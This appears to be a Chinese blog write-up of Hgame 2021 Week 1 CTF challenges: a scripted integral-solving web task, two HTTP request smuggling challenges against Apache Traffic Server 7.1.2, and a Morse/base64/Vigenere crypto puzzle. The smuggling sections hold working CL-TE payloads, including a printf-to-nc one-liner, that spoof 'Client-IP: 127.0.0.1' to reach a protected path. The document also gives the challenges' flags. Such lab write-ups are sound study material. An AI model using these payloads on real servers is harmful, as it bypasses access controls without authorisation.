<p>不过这个简单，积分式全部为ax+b的形式，直接匹配直接算就好了，都不需要和 Mathematica 联动。</p>
<p>相关的 API 在 <a target="_blank" rel="noopener" href="http://r4u.top:5000/static/js/fuckmath.js">http://r4u.top:5000/static/js/fuckmath.js</a></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>
        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>
        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>
                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>
        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
        xhrFields<span class="token operator">:</span> <span class="token punctuation">{</span>
            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>
        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>
    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>
    xhrFields<span class="token operator">:</span> <span class="token punctuation">{</span>
        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
                &lt;div class="alert alert-success"&gt;\n
                    &lt;strong&gt;Right!&lt;/strong&gt;\n
                &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
                &lt;div class="alert alert-danger"&gt;\n
                    &lt;strong&gt;Wrong!&lt;/strong&gt;\n
                &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>返回的公式格式为</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mrow</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msubsup</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>\u222b<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mrow</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>92<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mrow</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mrow</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>31<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mrow</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msubsup</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mn</span><span class="token punctuation">&gt;</span></span>17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mn</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mo</span><span class="token punctuation">&gt;</span></span>)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mo</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>d<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtd</span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mrow</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>然后写脚本就好了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token triple-quoted-string string">"""
Hgame Week1 Web 智商检测鸡
http://r4u.top:5000/
@Author: MiaoTony
@Time: 20210201
"""</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup

host <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"</span>
<span class="token punctuation">}</span>

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>headers <span class="token operator">=</span> headers


<span class="token keyword">def</span> <span class="token function">getInfo</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/getStatus"</span>
    r <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    solving <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"solving"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---"</span><span class="token punctuation">,</span> solving<span class="token punctuation">,</span> <span class="token string">"---"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> solving

<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span>
    r <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"====&gt;"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span>
    r <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    question <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"question"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"====&gt;"</span><span class="token punctuation">,</span> question<span class="token punctuation">)</span>
    <span class="token keyword">return</span> question

<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/api/verify"</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> answer<span class="token punctuation">}</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;===="</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>
    sub<span class="token punctuation">,</span> sup <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'msubsup &gt; mrow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'math &gt; mrow'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text
    x <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'\((-?\d+)x\+(\d+)\)'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>
    <span class="token comment"># a/2 x**2 + b x</span>
    answer <span class="token operator">=</span> a<span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>sup<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>sub<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token operator">*</span><span class="token punctuation">(</span>sup<span class="token operator">-</span>sub<span class="token punctuation">)</span>
    answer <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>answer<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>
    submit<span class="token punctuation">(</span>answer<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    status <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> status <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">:</span>
        q <span class="token operator">=</span> getQuestion<span class="token punctuation">(</span><span class="token punctuation">)</span>
        solve<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
        status <span class="token operator">=</span> getStatus<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>
        getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>然后就是愉快的解题环节，最后拿到 flag。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201182107072.png" alt="flag"></p>
<p><code>hgame{3very0ne_H4tes_Math}</code></p>
<h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><blockquote>
<p> <strong>hint: 注意留意服务器信息</strong><br> <strong>资料：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br> 宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br> 为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br> 调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br> 这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？</p>
<p>Challenge Address: <a target="_blank" rel="noopener" href="http://thief.0727.site/">http://thief.0727.site:80</a> </p>
</blockquote>
<p><strong>HTTP 走私</strong>，第一次听说这个概念喵。</p>
<p>Apache Traffic Server</p>
<p>看一下服务器，ATS/7.1.2，在漏洞的版本范围内，还正好和文中的一样。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202170856763.png" alt="ATS7.1.2"></p>
<p>直接访问 <code>/secret</code> 会提示 <code>Client-IP NOT FOUND IN HEADERS!</code>。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202214549490.png"></p>
<p>估计就是 ATS 传到后面的 Nginx 的时候，没有带上 <code>Client-IP</code>，但是如果手动给定 <code>Client-IP</code> 则会返回真实的 IP 而不是自己设置的。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#433%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%AC%AC%E4%B8%89%E4%B8%AA%E8%A1%A5%E4%B8%81%E3%80%82">https://paper.seebug.org/1048/#433，这个第三个补丁。</a></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a> # 3231 验证请求中的Content-Length头</p>
</blockquote>
<p>试了试 <code>CL-TE</code>走私攻击。</p>
<p>夹带请求一下 <code>/</code> 看看，果然能够返回主页。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202211257785.png"></p>
<p>然后带上攻击的 <code>Client-IP</code> 试试，拿到 flag。</p>
<p><strong>payload:</strong></p>
<pre class="language-none"><code class="language-none">GET /secret HTTP/1.1
Host: police.liki.link
Content-Length: 49
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Client-IP: 127.0.0.1
</code></pre>
<p>就是说当 ATS 把这一个 GET 请求交给 Nginx 的时候，后面的 Nginx 认为这是两个 GET 请求，于是当</p>
<pre class="language-none"><code class="language-none">GET /secret HTTP/1.1
Client-IP: 127.0.0.1
</code></pre>
<p>这一部分到 Nginx 的时候，就能伪造本地了。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202211600422.png"></p>
<p><code>hgame{HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!}</code></p>
<h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><blockquote>
<p><strong>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者</strong><br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br><strong>“我最讨厌顺风车，我将带来我的愤怒”</strong><br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。</p>
<p>Challenge Address: <a target="_blank" rel="noopener" href="http://police.liki.link/">http://police.liki.link</a> </p>
</blockquote>
<p>和上面那题不同，这个直接访问就给出了 <code>Client-IP</code>。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202215124791.png"></p>
<p>但是 payload 其实是一样的。</p>
<p>不过在 Burp Suite 不一定能出来，他基本上是只显示了第一个返回的 response，emmm 感觉是 burp 设计上的问题。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210202222723524.png"></p>
<p>但是直接在 nc 里执行就好了啦。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">'GET /secret HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>'</span>'Host: police.liki.link<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Content-Length: <span class="token number">49</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Transfer-Encoding: chunked<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token number">0</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>GET /secret HTTP/1.1<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Host: police.liki.link<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span>Client-IP: <span class="token number">127.0</span>.0.1<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">''</span><span class="token punctuation">\</span>r<span class="token punctuation">\</span>n'<span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">42.193</span>.143.243 <span class="token number">80</span></code></pre>
<p>很明显能看到返回了两个响应，多发几次就能在第二个返回里看到 flag 了。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203031441834.png"></p>
<p><code>hgame{Fe3l^tHe~4N9eR+oF_5mu9gl3r!!}</code></p>
<blockquote>
<p>看了官方 WP，原来这题中间多套了一层 Nginx，架构是 ATS -&gt; Nginx -&gt; LNMP，而前面那题是 ATS -&gt; LNMP。</p>
</blockquote>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="まひと"><a href="#まひと" class="headerlink" title="まひと"></a>まひと</h3><blockquote>
<p><strong>hint: flag的格式为hgame{xxx}（重要）</strong><br> 大家好，我叫真人，来自咒术回战，你也可以叫我，缝合怪！！</p>
</blockquote>
<pre class="language-none"><code class="language-none">---../-..../-..-./.----/-----/----./-..-./.----/-----/---../-..-./.----/.----/-----/-..-./----./-----/-..-./---../--.../-..-./...../...--/-..-./.----/-----/---../-..-./----./----./-..-./.----/-----/----./-..-./---../...../-..-./.----/.----/-..../-..-./---../....-/-..-./--.../.----/-..-./.----/-----/---../-..-./.----/.----/....-/-..-./----./--.../-..-./---../....-/-..-./.----/.----/..---/-..-./...../--.../-..-./---../-..../-..-./.----/-----/----./-..-./.----/.----/-..../-..-./.----/.----/-..../-..-./.----/-----/-----/-..-./.----/-----/--.../-..-./.----/.----/..---/-..-./.----/-----/...../-..-./--.../...--/-..-./---../....-/-..-./--.../-----/-..-./---../----./-..-./.----/-----/-----/-..-./-..../----./-..-./--.../-----/-..-./...../..---/-..-./----./-----/-..-./---../...--/-..-./--.../-----/-..-./.----/.----/.----/-..-./----./----./-..-./-..../----./-..-./....-/---../-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./....-/---../-..-./....-/---../-..-./.----/.----/....-/-..-./--.../----./-..-./---../---../-..-./.----/-----/....-/-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./.----/.----/-----/-..-./--.../....-/-..-./---../...../-..-./---../....-/-..-./---../-..../-..-./...../--.../-..-./--.../----./-..-./----./--.../-..-./.----/.----/-----/-..-./...../...--/-..-./.----/-----/-..../-..-./---../...../-..-./.----/-----/----./-..-./----./----./-..-./....-/---../-..-./.----/-----/.----/-..-./-..../...../-..-./-..../.----/-..-./-..../.----</code></pre>
<p>Morse code</p>
<pre class="language-none"><code class="language-none">86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61</code></pre>
<p>然后 chr，base64</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
s <span class="token operator">=</span> <span class="token string">"86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61"</span>
l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>
    x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    r <span class="token operator">+=</span> x
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA==</span>
r2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span>
<span class="token comment"># b'Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x'</span></code></pre>
<p>Vigenere 解密得到</p>
<pre class="language-none"><code class="language-none">}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n</code></pre>
<p>看上去像是逆序了的</p>
